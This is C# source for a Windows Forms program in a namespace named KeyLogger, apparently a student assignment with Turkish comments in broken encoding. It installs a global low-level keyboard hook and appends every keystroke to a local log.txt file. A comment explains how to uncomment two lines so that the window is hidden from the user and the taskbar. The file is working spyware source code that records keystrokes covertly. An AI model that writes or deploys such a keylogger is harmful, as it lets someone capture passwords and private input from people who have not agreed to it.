using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;

namespace KeyLogger
{
    public partial class Form1 : Form
    {
        // Windows API Baðlantýlarý
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // Deðiþkenler
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private LowLevelKeyboardProc _proc;
        private IntPtr _hookID = IntPtr.Zero;

        public Form1()
        {
            InitializeComponent();
            _proc = HookCallback;
            _hookID = SetHook(_proc);

            // ÖDEV ÝÇÝN: Formu gizlemek istersen aþaðýdaki iki satýrýn baþýndaki // iþaretini kaldýr
            // this.WindowState = FormWindowState.Minimized;
            // this.ShowInTaskbar = false;
        }

        private IntPtr SetHook(LowLevelKeyboardProc lpfn)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, lpfn, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string logText = "";
                Keys basilanTus = (Keys)vkCode;

                // Tuþlarý daha okunaklý hale getirme
                if (basilanTus == Keys.Space) logText = " ";
                else if (basilanTus == Keys.Enter) logText = Environment.NewLine;
                else if (basilanTus == Keys.Back) logText = "[Geri]";
                else logText = basilanTus.ToString();

                // Masaüstüne veya Debug klasörüne log.txt olarak kaydeder
                File.AppendAllText("log.txt", logText);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // Program kapanýrken kancayý temizle
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnhookWindowsHookEx(_hookID);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Burasý boþ kalsýn.
        }
    }
}   